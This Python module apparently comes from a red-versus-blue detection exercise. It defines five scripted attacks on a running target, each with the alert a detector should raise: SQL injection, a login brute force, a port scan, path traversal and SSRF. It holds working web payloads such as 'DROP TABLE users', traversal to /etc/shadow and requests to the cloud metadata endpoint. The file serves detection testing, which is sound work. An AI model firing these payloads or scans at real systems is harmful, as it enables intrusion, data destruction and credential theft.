"""The five attack scenarios.

Each performs a real attack against the running target — HTTP payloads or TCP
connections — and declares which alert type and source the blue team should
produce. Detectors never see these declarations; the referee uses them to check
the outcome.
"""

from __future__ import annotations

import socket

import requests

from .base import RedContext, Scenario, ScenarioResult

_TIMEOUT = 3.0


class SQLInjection(Scenario):
    name = "sql_injection"
    expected_alert = "sqli"
    source = "10.13.37.11"

    PAYLOADS = [
        "' OR 1=1--",
        "' UNION SELECT username, password FROM users--",
        "'; DROP TABLE users--",
        "1' AND SLEEP(5)--",
        "admin'--",
        "' OR '1'='1",
    ]

    def run(self, ctx: RedContext) -> ScenarioResult:
        headers = {"X-Actor": self.source}
        for payload in self.PAYLOADS:
            requests.get(f"{ctx.base_url}/search", params={"q": payload}, headers=headers, timeout=_TIMEOUT)
        return ScenarioResult(attacks=len(self.PAYLOADS), note="sqlmap-style payloads on /search")


class BruteForce(Scenario):
    name = "brute_force"
    expected_alert = "brute_force"
    source = "10.13.37.12"

    def run(self, ctx: RedContext) -> ScenarioResult:
        headers = {"X-Actor": self.source}
        attempts = 20
        for i in range(attempts):
            requests.post(
                f"{ctx.base_url}/login",
                data={"username": "admin", "password": f"guess-{i}"},
                headers=headers,
                timeout=_TIMEOUT,
            )
        return ScenarioResult(attacks=attempts, note="credential spray on /login")


class PortScan(Scenario):
    name = "port_scan"
    expected_alert = "port_scan"
    source = "127.0.0.1"  # TCP peer address on localhost

    def run(self, ctx: RedContext) -> ScenarioResult:
        touched = 0
        for port in ctx.tcp_ports:
            try:
                with socket.create_connection(("127.0.0.1", port), timeout=_TIMEOUT):
                    touched += 1
            except OSError:
                continue
        return ScenarioResult(attacks=touched, note="TCP sweep across host ports")


class PathTraversal(Scenario):
    name = "path_traversal"
    expected_alert = "path_traversal"
    source = "10.13.37.14"

    PAYLOADS = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc/passwd",
        "/var/www/../../etc/shadow",
    ]

    def run(self, ctx: RedContext) -> ScenarioResult:
        headers = {"X-Actor": self.source}
        for payload in self.PAYLOADS:
            requests.get(f"{ctx.base_url}/files", params={"path": payload}, headers=headers, timeout=_TIMEOUT)
        return ScenarioResult(attacks=len(self.PAYLOADS), note="traversal payloads on /files")


class SSRF(Scenario):
    name = "ssrf"
    expected_alert = "ssrf"
    source = "10.13.37.15"

    PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:6379/",
        "http://localhost/admin",
        "file:///etc/passwd",
    ]

    def run(self, ctx: RedContext) -> ScenarioResult:
        headers = {"X-Actor": self.source}
        for payload in self.PAYLOADS:
            requests.get(f"{ctx.base_url}/fetch", params={"url": payload}, headers=headers, timeout=_TIMEOUT)
        return ScenarioResult(attacks=len(self.PAYLOADS), note="internal-target fetches on /fetch")


def all_scenarios() -> list[Scenario]:
    return [SQLInjection(), BruteForce(), PortScan(), PathTraversal(), SSRF()]
